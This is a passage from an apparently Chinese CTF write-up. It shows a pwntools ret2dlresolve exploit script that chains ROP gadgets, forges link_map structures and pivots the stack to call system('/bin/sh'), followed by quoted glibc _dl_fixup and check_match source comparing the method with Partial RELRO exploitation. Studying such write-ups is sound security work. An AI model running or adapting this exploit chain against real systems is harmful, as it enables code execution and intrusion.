main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置a1为0x10，获得_dl_runtime_resolve函数地址，并存放在0x601fd0位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">501</span>, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里又一次读取了一下DT_DEBUG + 8的内容</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是向0x601020位置写入link_map地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这一步是修改link_map的dynrel指针指向bss段</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_write, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0x1f</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在bss段的对应位置写上fake_dynrel</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x310</span>).ljust(<span class="number">0x20</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在fake_dynrel结构体的偏移为0x8的位置只想的是fake_rel的地址，所以还需要在这里伪造</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x310</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(bss+<span class="number">0x700</span>, <span class="number">7</span>, <span class="number">0</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake strtab和/bin/sh</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x40</span>, <span class="string">b&quot;system\x00&quot;</span>).ljust(<span class="number">0x50</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖link_map中strtab指针的地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0xd</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake_symtab</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, elf.got[<span class="string">&#x27;read&#x27;</span>]-<span class="number">8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖link_map中的symtab指针的值</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0xe</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取link_map地址到0x601040位置</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入link_map地址，实现栈为_dl_runtime_resolve(&lt;-rsp)=&gt;link_map=&gt;0 并且此时rip为ret</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">503</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过栈迁移，顺利执行dl-runtime-resolve</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x601fc8</span>, pop_rdi, bss+<span class="number">0x100</span>+<span class="number">0x50</span>, <span class="number">0x400772</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r, <span class="string">&#x27;directory ./glibc-2.35/elf&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="重点：与Partial利用方式的区别"><a href="#重点：与Partial利用方式的区别" class="headerlink" title="重点：与Partial利用方式的区别"></a>重点：与Partial利用方式的区别</h2><h3 id="Partial利用方式重谈"><a href="#Partial利用方式重谈" class="headerlink" title="Partial利用方式重谈"></a>Partial利用方式重谈</h3><p><strong>( 在下面讨论老版本时，默认只存在栈溢出，不存在上述题目中的gadget )</strong></p><p>在以前的文章，在64位的partial保护中我写的非常粗糙，所以在这里也趁此机会详细谈一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uintptr_t</span> pltgot = (<span class="keyword">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是关于<code>_dl_fixup</code>函数的重新分析，通过字符串进行查找对应函数时我们需要进入到底这条if语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>而最终真正找到函数地址的函数其实是<code>_dl_lookup_symbol_x</code>函数。然而其中存在一条调用关系是<code>do_lookup_x</code>&#x3D;&gt;<code>check_match</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *</span></span><br><span class="line"><span class="function"><span class="title">check_match</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> undef_name,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> ref,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct r_found_version *<span class="keyword">const</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">int</span> type_class,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) *<span class="keyword">const</span> sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> Elf_Symndx symidx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct link_map *<span class="keyword">const</span> <span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> ElfW(Sym) **<span class="keyword">const</span> versioned_sym,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">int</span> *<span class="keyword">const</span> num_versions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">  assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line"> &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line"> &amp;&amp; stt != STT_TLS)</span><br><span class="line">|| elf_machine_sym_no_match (sym)</span><br><span class="line">|| (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">     STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">     code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span> (strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">    <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *verstab </span>= <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">  <span class="keyword">if</span> (version != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  assert (version-&gt;filename == <span class="literal">NULL</span></span><br><span class="line">  || ! _dl_name_match_p (version-&gt;filename, <span class="built_in">map</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Otherwise we accept the symbol.  */</span></span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">     default one if it is not hidden.  */</span></span><br><span class="line">  ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">       || <span class="built_in">strcmp</span> (<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span 